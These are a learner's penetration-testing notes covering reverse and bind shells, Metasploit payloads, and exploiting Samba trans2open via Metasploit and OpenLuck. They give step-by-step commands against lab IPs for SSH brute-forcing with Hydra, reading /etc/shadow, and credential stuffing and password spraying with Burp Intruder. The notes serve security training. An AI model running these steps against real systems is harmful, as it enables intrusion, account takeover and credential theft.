# Reverse Shells vs Blind Shells
shell = access to a machine
can use netcat `nc` to listen

### Reverse shell
- a target connects to us
- used most of the time

### Bind shell
- we open a port on the target, then we connect to it
- used for specific scenarios

❗️**Reverse shell = victim connects to us, Bind shell = we connect to victim**

# Staged vs Non-Staged Payloads
payload = what we run as an exploit to attempt to gain a shell on machine

### Non-staged
- sends exploit shellcode all at once
- larger in size and wont always work
- ex: `windows/meterpreter_reverse_tcp`
	- full payload

### Staged
- send payload in stages
- can be less stable
- ex: `windows/meterpreter/reverse_tcp`
	- 2 stage paylod

❗️**if you have a payload that doesn't work, try the other type of the same payload**

# Gaining Root with Metasploit
*attacking SMB*
1. search `searchsploit samba 2.2`
	- identified trans2open is juicy
2. load msf `msfconsole`
3. search the juicy `search trans2open`
	- select best option based on enum info
4. `use 1`
	- `options
	- `set rhosts [IP]
	- can check options again to make sure set is correct
	- check targets: `show targets`
5. run exploit, use `run` or `exploit`
	- is payload keeps dying, check options again for more info `options`
		- check for payload options
	- set payload (use tab for options): `set payload linux/x86/`
		- try non-staged: `set payload linux/x86/shell_reverse_tcp`
			- check `options` to verify
	- rerun exploit
6. if shell >> check `whoami` and `hostname`

# Manual Exploitation
*using OpenLuck*
1. follow github instructions
2. get number from supported offset list based on info from enum
3. run with parameters: `./open 0x6b 192.168.57.134 -c 40`
4. wait for exploit, if shell >> check `whoami` and `hostname`
5. can check /etc/passwd for users `cat /etc/passwd`
6. can check /etc/shadow for password hashes `cat /etc/shadow`

# Brute Force Attacks
*attacking SSH*
- to test password strength and how well blue team performs

### Hydra
- brute force tool
1. start `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt`
2. specify: `ssh://192.168.57.134:22 -t 4 -V`

Can run same thing in metasploit
1. `msfconsole
2. `search ssh`
	- look for SSH in list
3. past from list: `use auxiliary/scanner/ssh/ssh_login`
4. check and set options `options`
	- `set username root`
	- `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
	- `set rhosts 192.168.57.`
	- `set verbose true`
5. start exploit `run`

brute force may not work >> can let it run then kill if no results

# Credential Stuffing and Password Spraying
#### FoxyProxy
- install in firefox
- add proxy (Burp Suite) >> proxy type: HTTP >> IP: 127.0.0.1 >> Port: 8080 >> save
- can toggle to quickly turn burp suite on/off

### Credential Stuffing
- injecting breached account credentials in hoped of account takeover
1. navigate to webapp sign-in page
2. turn proxy/intercept on
3. input in fields and submit
4. in Burp, send intercept results to intruder
5. intruder >> positions >> clear
	-  highlight user/email and pass parameters (click add) 
6. use attack types - heath used pitchfork, sniper is most common (but uses one parameter)
7. copy breach list from recon >> paste into payloads in burp for payload set 1 (users) and set 2 (passwords)
8. start attack
	- observe any status changes, significant changes in length
	- check response >> take we can not sign you in insert into Grep - Match in Options, this will filter out

### Password Spraying
- using known usernames without a known password
- ask about password lockout so you don't lock users out
1. similar steps above
2. switch to sniper
3. start attack

❗️**If you see a login page - ALWAYS try default credentials**






